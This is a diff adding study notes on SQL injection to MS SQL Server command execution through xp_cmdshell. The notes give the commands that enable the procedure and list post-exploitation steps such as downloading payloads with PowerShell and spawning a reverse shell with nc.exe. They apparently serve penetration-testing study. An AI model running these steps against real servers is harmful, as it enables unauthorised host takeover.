@@ -117,3 +117,60 @@ These notes cover the **core methods, techniques, and considerations** for both 
 
 
 [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+
+# SQLi / MS SQL Server RCE / Database Exploitation
+
+---
+## **Key Concept:**
+
+- `xp_cmdshell` is a **built-in extended stored procedure** in MS SQL Server.
+- It allows you to **execute arbitrary OS commands** directly from SQL queries.
+- If enabled, it’s a **direct way to get a shell-like access** on the underlying Windows host.
+    
+
+---
+
+## **Usage / Syntax**
+
+```sql
+-- Execute a single command
+xp_cmdshell 'whoami';
+
+-- Execute multiple commands (use GO to terminate batch)
+xp_cmdshell 'dir C:\';
+GO
+```
+
+- `GO` = batch separator for SQL Server Management Studio (SSMS) or `sqlcmd`.
+- Typical commands:
+    - `whoami`, `ipconfig`, `net user` → info gathering
+    - `powershell -c "..."` → download & execute payloads
+    - `cmd.exe /c ...` → run batch commands
+
+---
+
+## **Pre-requisites**
+
+- SQL user must have **sysadmin privileges**, otherwise `xp_cmdshell` may be disabled.
+- If disabled, you can try:
+
+```sql
+-- Enable xp_cmdshell
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+GO
+```
+
+---
+
+## **Post-Exploitation / Shell**
+
+- Once xp_cmdshell works, you essentially have a **limited Windows shell**.
+- You can then pivot to:
+    - Upload/download files
+    - Run scripts
+    - Spawn a reverse shell with `powershell` or `nc.exe`
+
+---
